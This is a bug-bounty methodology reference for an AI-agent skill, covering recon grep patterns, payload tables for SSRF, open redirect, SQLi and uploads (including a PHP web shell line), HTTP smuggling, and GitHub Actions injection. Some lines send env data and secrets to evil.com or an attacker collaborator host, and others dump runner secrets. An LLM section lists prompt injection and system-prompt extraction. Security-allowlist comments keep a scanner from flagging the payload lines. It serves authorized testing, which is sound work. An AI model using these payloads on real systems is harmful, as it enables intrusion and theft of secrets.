# Details (moved from SKILL.md)

> Extended reference content for `bug-bounty`, kept under `references/` so the entrypoint stays within the audit budget.

## Source Code Recon
```bash
# Security surface
cat SECURITY.md 2>/dev/null; cat CHANGELOG.md | head -100 | grep -i "security\|fix\|CVE"
git log --oneline --all --grep="security\|CVE\|fix\|vuln" | head -20

# Dev breadcrumbs
grep -rn "TODO\|FIXME\|HACK\|UNSAFE" --include="*.ts" --include="*.js" | grep -iv "test\|spec"

# Dangerous patterns (JS/TS)
grep -rn "eval(\|innerHTML\|dangerouslySetInner\|execSync" --include="*.ts" --include="*.js" | grep -v node_modules <!-- security-allowlist: documented payload technique reference, do not execute outside authorized scope -->
grep -rn "===.*token\|===.*secret\|===.*hash" --include="*.ts" --include="*.js"
grep -rn "fetch(\|axios\." --include="*.ts" | grep "req\.\|params\.\|query\."

# Dangerous patterns (Solidity)
grep -rn "tx\.origin\|delegatecall\|selfdestruct\|block\.timestamp" --include="*.sol"
```

### Language-Specific Grep Patterns

```bash
# JavaScript/TypeScript -- prototype pollution, postMessage, RCE sinks
grep -rn "__proto__\|constructor\[" --include="*.js" --include="*.ts" | grep -v node_modules
grep -rn "postMessage\|addEventListener.*message" --include="*.js" | grep -v node_modules
grep -rn "child_process\|execSync\|spawn(" --include="*.js" | grep -v node_modules

# Python -- pickle, yaml.load, eval, shell injection
grep -rn "pickle\.loads\|yaml\.load\|eval(" --include="*.py" | grep -v test <!-- security-allowlist: documented payload technique reference, do not execute outside authorized scope -->
grep -rn "subprocess\|os\.system\|os\.popen" --include="*.py" | grep -v test
grep -rn "__import__\|exec(" --include="*.py"

# PHP -- type juggling, unserialize, LFI
grep -rn "unserialize\|eval(\|preg_replace.*e" --include="*.php" <!-- security-allowlist: documented payload technique reference, do not execute outside authorized scope -->
grep -rn "==.*password\|==.*token\|==.*hash" --include="*.php"
grep -rn "\$_GET\|\$_POST\|\$_REQUEST" --include="*.php" | grep "include\|require\|file_get"

# Go -- template.HTML, race conditions
grep -rn "template\.HTML\|template\.JS\|template\.URL" --include="*.go"
grep -rn "go func\|sync\.Mutex\|atomic\." --include="*.go"

# Ruby -- YAML.load, mass assignment
grep -rn "YAML\.load[^_]\|Marshal\.load\|eval(" --include="*.rb" <!-- security-allowlist: documented payload technique reference, do not execute outside authorized scope -->
grep -rn "attr_accessible\|permit(" --include="*.rb"

# Rust -- panic on network input, unsafe blocks
grep -rn "\.unwrap()\|\.expect(" --include="*.rs" | grep -v "test\|encode\|to_bytes\|serialize"
grep -rn "unsafe {" --include="*.rs" -B5 | grep "read\|recv\|parse\|decode"
grep -rn "as u8\|as u16\|as u32\|as usize" --include="*.rs" | grep -v "checked\|saturating\|wrapping"
```

---

# PHASE 2: LEARN (Pre-Hunt Intelligence)


## Read Disclosed Reports
```bash
# By program on HackerOne
curl -s "https://hackerone.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ hacktivity_items(first:25, order_by:{field:popular, direction:DESC}, where:{team:{handle:{_eq:\"PROGRAM\"}}}) { nodes { ... on HacktivityDocument { report { title severity_rating } } } } }"}' \
  | jq '.data.hacktivity_items.nodes[].report'
```


## "What Changed" Method
1. Find disclosed report for similar tech
2. Get the fix commit
3. Read the diff -- identify the anti-pattern
4. Grep your target for that same anti-pattern


## Threat Model Template
```
TARGET: _______________
CROWN JEWELS: 1.___ 2.___ 3.___
ATTACK SURFACE:
  [ ] Unauthenticated: login, register, password reset, public APIs
  [ ] Authenticated: all user-facing endpoints, file uploads, API calls
  [ ] Cross-tenant: org/team/workspace ID parameters
  [ ] Admin: /admin, /internal, /debug
HIGHEST PRIORITY (crown jewel x easiest entry):
  1.___ 2.___ 3.___
```


## 6 Key Patterns from Top Reports
1. **Feature Complexity = Bug Surface** -- imports, integrations, multi-tenancy, multi-step workflows
2. **Developer Inconsistency = Strongest Evidence** -- `timingSafeEqual` in one place, `===` elsewhere
3. **"Else Branch" Bug** -- proxy/gateway passes raw token without validation in else path
4. **Import/Export = SSRF** -- every "import from URL" feature has historically had SSRF
5. **Secondary/Legacy Endpoints = No Auth** -- `/api/v1/` guarded but `/api/` isn't
6. **Race Windows in Financial Ops** -- check-then-deduct as two DB operations = double-spend

---

# PHASE 3: HUNT


## Note-Taking System (Never Hunt Without This)
```markdown
# TARGET: company.com -- SESSION 1


## Interesting Leads (not confirmed bugs yet)
- [14:22] /api/v2/invoices/{id} -- no auth check visible in source, testing...


## Dead Ends (don't revisit)
- /admin -> IP restricted, confirmed by trying 15+ bypass headers


## Anomalies
- GET /api/export returns 200 even when session cookie is missing
- Response time: POST /api/check-user -> 150ms (exists) vs 8ms (doesn't)


## Rabbit Holes (time-boxed, max 15 min each)
- [ ] 10 min: JWT kid injection on auth endpoint


## Confirmed Bugs
- [15:10] IDOR on /api/invoices/{id} -- read+write
```


## Subdomain Type -> Hunt Strategy
- **dev/staging/test**: Debug endpoints, disabled auth, verbose errors
- **admin/internal**: Default creds, IP bypass headers (`X-Forwarded-For: 127.0.0.1`)
- **api/api-v2**: Enumerate with kiterunner, check older unprotected versions
- **auth/sso**: OAuth misconfigs, open redirect in `redirect_uri`
- **upload/cdn**: CORS, path traversal, stored XSS


## CVE-Seeded Audit Approach
1. **Build a CVE eval set** -- collect 5-10 prior CVEs for the target codebase
2. **Reproduce old bugs** -- verify you can find the pattern in older code
3. **Pattern-match forward** -- search for the same anti-pattern in current code
4. **Focus on wide attack surfaces** -- JS engines, parsers, anything processing untrusted external input


## Rust/Blockchain Source Code (Hard-Won Lessons)

**Panic paths: encoding vs decoding** -- `.unwrap()` on an encoding path is NOT attacker-triggerable. Only panics on deserialization/decoding of network input are exploitable.

**"Known TODO" is not a mitigation** -- A comment like `// Votes are not signed for now` doesn't mean safe.

**Pattern-based hunting from confirmed findings** -- If `verify_signed_vote` is broken, check `verify_signed_proposal` and `verify_commit_signature`.

```bash
# Rust dangerous patterns (network-facing)
grep -rn "\.unwrap()\|\.expect(" --include="*.rs" | grep -v "test\|encode\|to_bytes\|serialize"
grep -rn "if let Ok\|let _ =" --include="*.rs" | grep -i "verify\|sign\|cert\|auth"
grep -rn "TODO\|FIXME\|not signed\|not verified\|for now" --include="*.rs" | grep -i "sign\|verify\|cert\|auth"
```

---

# VULNERABILITY HUNTING CHECKLISTS


## IDOR -- Insecure Direct Object Reference

> #1 most paid web2 class -- 30% of all submissions that get paid.

### IDOR Variants (10 Ways to Test)

| Variant | What to Test |
|---------|-------------|
| V1: Direct | Change object ID in URL path `/api/users/123` -> `/api/users/456` |
| V2: Body param | Change ID in POST/PUT JSON body `{"user_id": 456}` |
| V3: GraphQL node | `{ node(id: "base64(OtherType:123)") { ... } }` |
| V4: Batch/bulk | `/api/users?ids=1,2,3,4,5` -- request multiple IDs at once |
| V5: Nested | Change parent ID: `/orgs/{org_id}/users/{user_id}` |
| V6: File path | `/files/download?path=../other-user/file.pdf` |
| V7: Predictable | Sequential integers, timestamps, short UUIDs |
| V8: Method swap | GET returns 403? Try PUT/PATCH/DELETE on same endpoint |
| V9: Version rollback | v2 blocked? Try `/api/v1/` same endpoint |
| V10: Header injection | `X-User-ID: victim_id`, `X-Org-ID: victim_org` |

### IDOR Testing Checklist
- [ ] Create two accounts (A = attacker, B = victim)
- [ ] Log in as A, perform all actions, note all IDs in requests
- [ ] Log in as B, replay A's requests with A's IDs using B's auth
- [ ] Try EVERY endpoint with swapped IDs -- not just GET, also PUT/DELETE/PATCH
- [ ] Check API v1/v2 differences
- [ ] Check GraphQL schema for node() queries
- [ ] Check WebSocket messages for client-supplied IDs
- [ ] Test batch endpoints (can you request multiple IDs?)
- [ ] Try adding unexpected params: `?user_id=other_user`

### IDOR Chains (higher payout)
- IDOR + Read PII = Medium
- IDOR + Write (modify other's data) = High
- IDOR + Admin endpoint = Critical (privilege escalation)
- IDOR + Account takeover path = Critical
- IDOR + Chatbot (LLM reads other user's data) = High


## SSRF -- Server-Side Request Forgery

- [ ] Try cloud metadata: `http://169.254.169.254/latest/meta-data/`
- [ ] Try internal services: `http://127.0.0.1:6379/` (Redis), `:9200` (Elasticsearch), `:27017` (MongoDB)
- [ ] Test all IP bypass techniques (see table below)
- [ ] Test protocol bypass: `file://`, `dict://`, `gopher://`
- [ ] Look in: webhook URLs, import from URL, profile picture URL, PDF generators, XML parsers

### SSRF IP Bypass Table (11 Techniques)

| Bypass | Payload | Notes |
|--------|---------|-------|
| Decimal IP | `http://2130706433/` | 127.0.0.1 as single decimal |
| Hex IP | `http://0x7f000001/` | Hex representation |
| Octal IP | `http://0177.0.0.1/` | Octal 0177 = 127 |
| Short IP | `http://127.1/` | Abbreviated notation |
| IPv6 | `http://[::1]/` | Loopback in IPv6 |
| IPv6-mapped | `http://[::ffff:127.0.0.1]/` | IPv4-mapped IPv6 |
| Redirect chain | `http://attacker.com/302->http://169.254.169.254` | Check each hop |
| DNS rebinding | Register domain resolving to 127.0.0.1 | First check = external, fetch = internal |
| URL encoding | `http://127.0.0.1%2523@attacker.com` | Parser confusion |
| Enclosed alphanumeric | `http://①②⑦.⓪.⓪.①` | Unicode numerals |
| Protocol smuggling | `gopher://127.0.0.1:6379/_INFO` | Redis/other protocols |

### SSRF Impact Chain
- DNS-only = Informational (don't submit)
- Internal service accessible = Medium
- Cloud metadata readable = High (key exposure)
- Cloud metadata + exfil keys = Critical (code execution on cloud)
- Docker API accessible = Critical (direct RCE)


## OAuth / OIDC

- [ ] Missing `state` parameter -> CSRF
- [ ] `redirect_uri` accepts wildcards -> ATO
- [ ] Missing PKCE -> code theft
- [ ] Implicit flow -> token leakage in referrer
- [ ] Open redirect in post-auth redirect -> OAuth token theft chain

### Open Redirect Bypass Table (11 Techniques)

Use these when chaining open redirect into OAuth code theft:

| Bypass | Payload | Notes |
|--------|---------|-------|
| Double URL encoding | `%252F%252F` | Decodes to `//` after double decode |
| Backslash | `https://target.com\@evil.com` | Some parsers normalize `\` to `/` |
| Missing protocol | `//evil.com` | Protocol-relative |
| @-trick | `https://target.com@evil.com` | target.com becomes username |
| Protocol-relative | `///evil.com` | Triple slash |
| Tab/newline injection | `//evil%09.com` | Whitespace in hostname |
| Fragment trick | `https://evil.com#target.com` | Fragment misleads validation |
| Null byte | `https://evil.com%00target.com` | Some parsers truncate at null |
| Parameter pollution | `?next=target.com&next=evil.com` | Last value wins |
| Path confusion | `/redirect/..%2F..%2Fevil.com` | Path traversal in redirect |
| Unicode normalization | `https://evil.com/target.com` | Visual confusion |


## File Upload

### File Upload Bypass Table

| Bypass | Technique |
|--------|-----------|
| Double extension | `file.php.jpg`, `file.php%00.jpg` |
| Case variation | `file.pHp`, `file.PHP5` |
| Alternative extensions | `.phtml`, `.phar`, `.shtml`, `.inc` |
| Content-Type spoof | `image/jpeg` header with PHP content |
| Magic bytes | `GIF89a; <?php system($_GET['c']); ?>` |
| .htaccess upload | `AddType application/x-httpd-php .jpg` |
| SVG XSS | `<svg onload=alert(1)>` |
| Race condition | Upload + execute before cleanup runs |
| Polyglot JPEG/PHP | Valid JPEG that is also valid PHP |
| Zip slip | `../../etc/cron.d/shell` in filename inside archive |

### Magic Bytes Reference
| Type | Hex |
|------|-----|
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| GIF | `47 49 46 38` |
| PDF | `25 50 44 46` |
| ZIP/DOCX/XLSX | `50 4B 03 04` |


## Race Conditions

- [ ] Coupon codes / promo codes
- [ ] Gift card redemption
- [ ] Fund transfer / withdrawal
- [ ] Voting / rating limits
- [ ] OTP verification brute via race

```bash
seq 20 | xargs -P 20 -I {} curl -s -X POST https://TARGET/redeem \
  -H "Authorization: Bearer $TOKEN" -d 'code=PROMO10' &
wait
```

### Turbo Intruder -- Single-Packet Attack (All Requests Arrive Simultaneously)
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False,
                           engine=Engine.BURP2)
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')  # all 20 fire in a single TCP packet

def handleResponse(req, interesting):
    table.add(req)
```


## Business Logic
- [ ] Negative quantities in cart
- [ ] Price parameter tampering
- [ ] Workflow skip (e.g., pay without checkout)
- [ ] Role escalation via registration fields
- [ ] Privilege persistence after downgrade


## XSS -- Cross-Site Scripting

### XSS Sinks (grep for these)
```javascript
// HIGH RISK
innerHTML = userInput
outerHTML = userInput
document.write(userInput)
eval(userInput) <!-- security-allowlist: documented payload technique reference, do not execute outside authorized scope -->
setTimeout(userInput, ...)    // string form
setInterval(userInput, ...)
new Function(userInput)

// MEDIUM RISK (context-dependent)
element.src = userInput        // JavaScript URI possible
element.href = userInput
location.href = userInput
```

### XSS Chains (escalate from Medium to High/Critical)
- XSS + sensitive page (banking, admin) = High
- XSS + CSRF token theft = CSRF bypass -> Critical action
- XSS + service worker = persistent XSS across pages
- XSS + credential theft via fake login form = ATO
- XSS in chatbot response = stored XSS chain


## SQL Injection

### Detection
```bash
# Single quote test
' OR '1'='1
' OR 1=1--
' UNION SELECT NULL--

# Error-based detection
'; SELECT 1/0--    # divide by zero error reveals SQLi
```

### Modern SQLi WAF Bypass
```sql
-- Comment variation
/*!50000 SELECT*/ * FROM users
SE/**/LECT * FROM users
-- Case variation
SeLeCt * FrOm uSeRs
-- URL encoding
%27 OR %271%27=%271
-- Unicode apostrophe
' OR '1'='1
```


## GraphQL

### Introspection (alone = Informational, but reveals attack surface)
```graphql
{ __schema { types { name fields { name type { name } } } } }
```

### Missing Field-Level Auth
```graphql
# User query returns only own data
{ user(id: 1) { name email } }
# But node() bypasses per-object auth:
{ node(id: "dXNlcjoy") { ... on User { email phoneNumber ssn } } }
```

### Batching Attack (Rate Limit Bypass)
```json
[
  {"query": "{ login(email: \"user@test.com\", password: \"pass1\") }"},
  {"query": "{ login(email: \"user@test.com\", password: \"pass2\") }"},
  "...100 more..."
]
```


## LLM / AI Features

- [ ] Prompt injection via user input passed to LLM
- [ ] Indirect injection via document/URL the AI processes
- [ ] IDOR in chat history (enumerate conversation IDs)
- [ ] System prompt extraction via roleplay/encoding
- [ ] RCE via code execution tool abuse
- [ ] ASCII smuggling (invisible unicode in LLM output)

### Agentic AI Hunting (OWASP ASI01-ASI10)

When target has AI agents with tool access, these are the 10 attack classes:

| ID | Vuln Class | What to Test |
|----|-----------|-------------|
| ASI01 | Prompt injection | Override system prompt via user input -- make agent ignore its rules |
| ASI02 | Tool misuse | Make AI call tools with attacker-controlled params (SSRF via "fetch URL", RCE via code tool) |
| ASI03 | Data exfil | Extract training data / PII via crafted prompts that leak context |
| ASI04 | Privilege escalation | Use AI to access admin-only tools -- agent has broader perms than user |
| ASI05 | Indirect injection | Poison document/URL the AI processes -- hidden instructions in fetched content |
| ASI06 | Excessive agency | AI takes destructive actions without confirmation -- delete, send, pay |
| ASI07 | Model DoS | Craft inputs that cause infinite loops, excessive token usage, or OOM |
| ASI08 | Insecure output | AI generates XSS/SQLi/command injection in its output that gets rendered |
| ASI09 | Supply chain | Compromised plugins/tools/MCP servers the AI calls |
| ASI10 | Sensitive disclosure | AI reveals internal configs, API keys, system prompts, user data |

**Triage rule:** ASI alone = Informational. Must chain to IDOR/exfil/RCE/ATO for paid bounty.


## Cache Poisoning / Web Cache Deception
- [ ] Test `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL` -- unkeyed headers reflected in response
- [ ] Parameter cloaking (`?param=value;poison=xss`)
- [ ] Fat GET (body params on GET requests)
- [ ] Web cache deception (`/account/settings.css` -- trick cache into storing private response)
- [ ] Param Miner (Burp extension) -- auto-discovers unkeyed headers


## HTTP Request Smuggling
- [ ] CL.TE: Content-Length processed by frontend, Transfer-Encoding by backend
- [ ] TE.CL: Transfer-Encoding processed by frontend, Content-Length by backend
- [ ] H2.CL: HTTP/2 downgrade smuggling
- [ ] TE obfuscation: `Transfer-Encoding: xchunked`, tab prefix, space prefix
- [ ] Use Burp "HTTP Request Smuggler" extension -- detects automatically

### CL.TE Example
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
Frontend reads Content-Length: 13 -> sends all. Backend reads Transfer-Encoding -> sees chunk "0" = end -> "SMUGGLED" left in buffer -> next user's request poisoned.


## Android / Mobile Hunting
- [ ] Certificate pinning bypass (Frida/objection)
- [ ] Exported activities/receivers (AndroidManifest.xml)
- [ ] Deep link injection
- [ ] Shared preferences / SQLite in cleartext
- [ ] WebView JavaScript bridge
- [ ] Mobile API often uses older/different API version than web


## CI/CD Pipeline — GitHub Actions Security

> **Tooling**: Use [sisakulint](https://sisaku-security.github.io/lint/) for automated SAST — 52 rules, taint propagation across steps/jobs/reusable workflows, 81.6% coverage of GitHub Security Advisories (31/38 GHSAs). Install: `brew install sisakulint` or download binary from releases.
>
> **Quick scan**: `sisakulint scan .github/workflows/` — flags Critical/High issues with auto-fix suggestions.
> **Remote scan**: `sisakulint scan --remote owner/repo` — scan without cloning.

### Recon: Finding Workflow Files

```bash
# Clone target's public repos, then:
find . -name "*.yml" -path "*/.github/workflows/*" | head -50

# Quick grep for dangerous patterns:
grep -rn "pull_request_target\|workflow_run" .github/workflows/
grep -rn 'github\.event\.\(issue\|pull_request\|comment\)' .github/workflows/
grep -rn 'GITHUB_ENV\|GITHUB_OUTPUT\|GITHUB_PATH' .github/workflows/
grep -rn 'secrets\.\|secrets: inherit' .github/workflows/

# Run sisakulint on all workflows:
sisakulint scan .github/workflows/
```

### Category 1: Code Injection & Expression Safety (CICD-SEC-04)

**Root cause**: Untrusted input (`github.event.issue.title`, `github.event.pull_request.body`, branch names, commit messages) interpolated into `run:` blocks via `${{ }}` expressions.

**Taint sources** (attacker-controlled):
```
github.event.issue.title / .body
github.event.pull_request.title / .body / .head.ref
github.event.comment.body
github.event.review.body
github.event.pages.*.page_name
github.event.commits.*.message / .author.name
github.event.head_commit.message / .author.name
github.event.workflow_run.head_branch
github.head_ref
```

- [ ] **Expression injection** — `${{ github.event.issue.title }}` in `run:` block = RCE
  ```yaml
  # VULNERABLE — attacker creates issue with title: a]]; curl https://evil.com/$(env | base64) #
  run: echo "${{ github.event.issue.title }}"

  # FIXED — use env var (shell-quoted, not expression-interpolated)
  env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "$TITLE"
  ```
- [ ] **Environment variable injection** — untrusted input → `$GITHUB_ENV`
  ```yaml
  # VULNERABLE — attacker injects newline + arbitrary VAR=VALUE
  run: echo "BRANCH=${{ github.head_ref }}" >> $GITHUB_ENV

  # FIXED — use heredoc delimiter
  run: |
    {
      echo "BRANCH<<EOF"
      echo "${{ github.head_ref }}"
      echo "EOF"
    } >> $GITHUB_ENV
  ```
- [ ] **PATH injection** — untrusted input → `$GITHUB_PATH` = arbitrary binary execution
- [ ] **Output clobbering** — untrusted input → `$GITHUB_OUTPUT` without heredoc delimiter = downstream job manipulation
- [ ] **Argument injection** — untrusted input as CLI argument (e.g., `docker run ${{ ... }}`)
  ```yaml
  # VULNERABLE
  run: docker run ${{ github.event.pull_request.body }}

  # FIXED — end-of-options marker + env var
  env:
    INPUT: ${{ github.event.pull_request.body }}
  run: docker run -- "$INPUT"
  ```
- [ ] **Request forgery (SSRF)** — attacker-controlled URL in `curl`/`wget` within workflow

### Category 2: Pipeline Poisoning & Untrusted Checkout

**Root cause**: Privileged triggers (`pull_request_target`, `workflow_run`) checkout attacker's PR code, which then runs with repository secrets.

- [ ] **Untrusted checkout** — `actions/checkout` on `pull_request_target` without explicit safe ref
  ```yaml
  # VULNERABLE — checks out attacker's PR code with repo secrets
  on: pull_request_target
  jobs:
    build:
      steps:
        - uses: actions/checkout@v4
          with:
            ref: ${{ github.event.pull_request.head.sha }}  # ATTACKER CODE
        - run: make build  # runs attacker's Makefile with secrets

  # FIXED — only checkout base branch, or use read-only permissions
  permissions: {}
  steps:
    - uses: actions/checkout@v4  # checks out base branch by default
  ```
- [ ] **TOCTOU (Time-of-Check-Time-of-Use)** — label-gated approval + mutable ref = attacker adds label, pushes malicious commit after approval
- [ ] **Reusable workflow taint** — `secrets: inherit` passes all secrets to called workflow that processes untrusted input
- [ ] **Cache poisoning** — untrusted checkout → build → cache write → trusted workflow reads poisoned cache
- [ ] **Cache poisoning (poisonable step)** — unsafe checkout followed by build step before cache save
- [ ] **Artifact poisoning** — `actions/download-artifact` from untrusted `workflow_run` without validation
  ```yaml
  # VULNERABLE — downloads artifact from untrusted workflow, then executes it
  on: workflow_run
  steps:
    - uses: actions/download-artifact@v4
    - run: ./downloaded-binary  # attacker-controlled binary

  # FIXED — verify artifact hash/signature before execution
  ```
- [ ] **Artipacked** — `actions/checkout` with `persist-credentials: true` (default) leaks `.git/config` credentials in uploaded artifacts
  ```yaml
  # FIXED
  - uses: actions/checkout@v4
    with:
      persist-credentials: false
  ```

### Category 3: Supply Chain & Dependency Security (CICD-SEC-08)

- [ ] **Unpinned actions** — `uses: actions/checkout@v4` (mutable tag) instead of SHA pin
  ```yaml
  # VULNERABLE — tag can be force-pushed
  uses: actions/checkout@v4

  # FIXED — pinned to immutable commit SHA
  uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
  ```
- [ ] **Impostor commit** — fork network allows pushing commits with SHA that appears to belong to upstream repo
- [ ] **Ref confusion** — ambiguous tag/branch names exploited to load unintended action version
- [ ] **Known vulnerable actions** — check actions against GHSA database (sisakulint detects automatically)
- [ ] **Archived actions** — unmaintained action with unpatched vulnerabilities
- [ ] **Unpinned container images** — `image: ubuntu:latest` instead of SHA256 digest pin

### Category 4: Credential & Secret Protection

- [ ] **Secret exfiltration** — `curl https://evil.com/${{ secrets.TOKEN }}` in workflow
- [ ] **Secrets in artifacts** — uploaded artifacts contain `.env`, credentials, or hidden files
  ```yaml
  # FIXED — exclude hidden files
  - uses: actions/upload-artifact@v4
    with:
      include-hidden-files: false
  ```
- [ ] **Unmasked secrets** — `fromJson()` derived values bypass GitHub's automatic masking
  ```yaml
  # FIXED — manually mask derived secrets
  run: |
    TOKEN=$(echo '${{ secrets.JSON_CREDS }}' | jq -r '.token')
    echo "::add-mask::$TOKEN"
  ```
- [ ] **Excessive `secrets: inherit`** — reusable workflow call inherits all secrets when it only needs one
- [ ] **Hardcoded credentials** — API keys, passwords, tokens directly in workflow YAML

### Category 5: Triggers & Access Control (CICD-SEC-01)

- [ ] **Dangerous triggers without mitigation** — `pull_request_target` or `workflow_run` with no `permissions: {}`, no approval gate, no ref restriction
- [ ] **Dangerous triggers with partial mitigation** — some protections present but bypassable
- [ ] **Label-based approval bypass** — `if: contains(github.event.pull_request.labels.*.name, 'approved')` is spoofable (attacker can add labels)
- [ ] **Bot condition spoofing** — `if: github.actor != 'dependabot[bot]'` is trivially bypassed by naming account similarly
- [ ] **Excessive GITHUB_TOKEN permissions** — `permissions: write-all` when only `contents: read` needed
- [ ] **Self-hosted runners in public repos** — untrusted PRs execute on org infrastructure = container escape → lateral movement
- [ ] **OIDC token theft** — CI runners expose OIDC tokens that grant cloud access

### Category 6: AI Agent Security (NEW — 2025+)

- [ ] **Unrestricted AI trigger** — `allowed_non_write_users: "*"` lets any user trigger AI agent execution
- [ ] **Excessive tool grants** — AI agent given Bash/Write/Edit tools in untrusted trigger context = attacker prompt → RCE
- [ ] **Prompt injection via workflow context** — `${{ github.event.issue.body }}` interpolated into AI agent prompt parameter

### Hunting Workflow

```
1. Recon: find all .github/workflows/*.yml in target's public repos
2. Scan: sisakulint scan .github/workflows/ (or --remote owner/repo)
3. Triage: Critical/High findings → manual verification
4. For each finding:
   a. Can I trigger this as an external contributor? (fork PR, issue creation, comment)
   b. What secrets are accessible? (check permissions: block, secrets usage)
   c. What's the blast radius? (repo secrets → deploy keys → cloud access)
5. PoC: create a fork, submit PR/issue that triggers the vulnerable workflow
6. Prove: show secret exfiltration, code execution, or artifact tampering
```

### Expression Injection PoC Template

```bash
# Step 1: Create an issue with injection payload in title
gh issue create --repo TARGET/REPO --title '"; curl https://ATTACKER.burpcollaborator.net/$(cat $GITHUB_ENV | base64 -w0) #' --body "test"

# Step 2: If workflow triggers on issues and interpolates title → secrets exfiltrated
# CVSS: 9.3 Critical (RCE with repo secrets)
```

### Real-World GHSAs (Proven Payouts)

| GHSA | Action | Bug Class | Severity |
|---|---|---|---|
| GHSA-gq52-6phf-x2r6 | tj-actions/branch-names | Expression injection via branch name | Critical |
| GHSA-4xqx-pqpj-9fqw | atlassian/gajira-create | Code injection in privileged trigger | Critical |
| GHSA-g86g-chm8-7r2p | check-spelling/check-spelling | Secret exposure in build logs | Critical |
| GHSA-cxww-7g56-2vh6 | actions/download-artifact | Artifact poisoning (official action) | High |
| GHSA-h3qr-39j9-4r5v | gradle/gradle-build-action | Cache poisoning via untrusted checkout | High |
| GHSA-mrrh-fwg8-r2c3 | tj-actions/changed-files | Supply chain — impostor commit | High |
| GHSA-phf6-hm3h-x8qp | broadinstitute/cromwell | Token exposure via code injection | Critical |
| GHSA-qmg3-hpqr-gqvc | reviewdog/action-setup | Time-bomb via tag pinning | High |
| GHSA-vqf5-2xx6-9wfm | github/codeql-action | Known vulnerable official action | High |
| GHSA-hw6r-g8gj-2987 | pytorch/pytorch | Argument injection in build workflow | Moderate |

### A→B Signal: CI/CD Chains

```
Expression injection → secret exfiltration → cloud account takeover
Untrusted checkout → Makefile RCE → deploy key theft → repo takeover
Artifact poisoning → release binary tampering → supply chain compromise
Cache poisoning → build output manipulation → backdoored deployment
Impostor commit → pinned action hijack → all downstream repos affected
OIDC token theft → cloud metadata → S3/GCS read → customer data
Self-hosted runner → container escape → internal network pivot
```

### Deep-Dive: From sisakulint Finding to Bounty Report

sisakulint findings are **potentially exploitable** — not confirmed bugs. Every finding needs manual verification. The patterns below are extracted from 36 real-world paid reports ($250K+ total payouts). Each section follows the thinking that led to actual bounty payments.

#### 1. Code Injection / Argument Injection

**Gate question:** Can an external attacker trigger this workflow AND does the tainted input reach a shell context?

**Verification depth:**
1. **Trigger accessibility** — `issues: opened` and `issue_comment: created` are triggerable by ANY GitHub user. `pull_request_target` is triggerable via fork PR. Check if there's an `if:` condition filtering by actor/association.
2. **Direct vs transitive taint** — The workflow file itself may look safe. Cycode found Bazel's $13K bug because `cherry-picker.yml` passed `${{ github.event.issue.title }}` via `with:` to a **composite action in another repo** (`bazelbuild/continuous-integration`). The composite action's `action.yml` had `run: TITLE="${{ inputs.issue-title }}"`. Conventional scanners (actionlint) missed this because they don't follow `uses:` into external composite actions. **Always fetch and read the composite action's action.yml.**
3. **Payload construction** — Branch names cannot contain spaces. Ultralytics YOLO attacker used `${IFS}` (Internal Field Separator) and Bash brace expansion `{curl,-sSfL,URL}` to bypass this. Issue titles/bodies have no such restriction.
4. **Secrets reachability** — Check `permissions:` at workflow AND job level. No explicit `permissions:` block = repo default (often `write-all`). Check `env:` blocks for `${{ secrets.* }}`. Check if `GITHUB_TOKEN` has write permissions.
5. **Impact chain** — Bazel: issue title injection → composite action shell injection → `BAZEL_IO_TOKEN` + `GITHUB_TOKEN (write-all)` → Bazel codebase backdoor capability (affects Google, Kubernetes, Uber, LinkedIn).

**Kill signals:** `${{ contains(...) }}` or `${{ startsWith(...) }}` returning booleans are NOT injectable — false positive. `${{ github.event.pull_request.labels.*.name }}` inside `contains()` evaluates to `true`/`false`, not the label text.

#### 2. Untrusted Checkout (Pwn Request)

**Gate question:** Does the workflow checkout attacker-controlled code AND then execute something from that checkout?

**Verification depth:**
1. **Explicit vs implicit code execution** — The Flank $7.5K bug: `gh pr checkout` → `gradle/gradle-build-action` runs Gradle → Gradle auto-evaluates `settings.gradle.kts` as Kotlin script. The attacker never wrote a `run:` command. **Any build tool that reads config from the repo is an execution vector**: `Makefile`, `package.json` (postinstall scripts), `setup.py`, `build.gradle.kts`, `.cargo/config.toml`, `Gemfile`.
2. **Issue_comment is as dangerous as pull_request_target** — Rspack NPM token theft: `issue_comment` trigger + `refs/pull/${{ github.event.issue.number }}/head` checkout. `issue_comment` runs in base repo context with full secrets. Draft PRs are included. No contributor status check. **Always check issue_comment workflows for PR checkout patterns.**
3. **Self-hosted runner escalation** — If `runs-on:` contains `self-hosted`, check: (a) Is the runner ephemeral? (`--ephemeral` in config.sh). (b) Is the runner in Docker group? (`docker run -v /:/host --privileged`). (c) PyTorch pattern: contributor trick (typo fix PR → merge → contributor status → auto-trigger on self-hosted runner without approval) → RoR (Runner-on-Runner: `RUNNER_TRACKING_ID=0` + install attacker's runner agent) → wait for privileged workflow → steal PATs from `.git/config` or process memory.
4. **TOCTOU** — Label-gated `pull_request_target` workflows: attacker gets label added (social engineering), workflow checks label exists, attacker pushes malicious commit between check and checkout. The `ref:` at checkout time resolves to the new commit. **Mutable refs (`github.event.pull_request.head.sha` at trigger time vs checkout time) are the root cause.**
5. **Post-exploitation** — After initial access, enumerate all secrets: `env | base64`, `cat /proc/self/environ`, `gcore $(pgrep Runner.Worker)` + `strings core.* | grep ghp_`. PyTorch attackers got 3 bot PATs → combined them to bypass branch protection on main.

**Kill signals:** `if: "!github.event.pull_request.head.repo.fork"` blocks external attackers. `permissions: {}` at workflow level with only `contents: read` at job level limits damage. Ephemeral runners with `--ephemeral` flag prevent persistence.

#### 3. Artifact Poisoning

**Gate question:** Is there a TWO-STAGE workflow pattern where Stage 1 (pull_request, no secrets) uploads artifacts and Stage 2 (workflow_run, with secrets) downloads and uses them?

**Verification depth:**
1. **Cross-workflow artifact flow** — Same-workflow upload/download (build job → test job via `needs:`) is NOT poisonable because the attacker's PR runs their own build. The dangerous pattern is: `pull_request` workflow uploads → separate `workflow_run` workflow downloads. `workflow_run` triggers on the completion of another workflow and runs in the DEFAULT BRANCH context with full secrets.
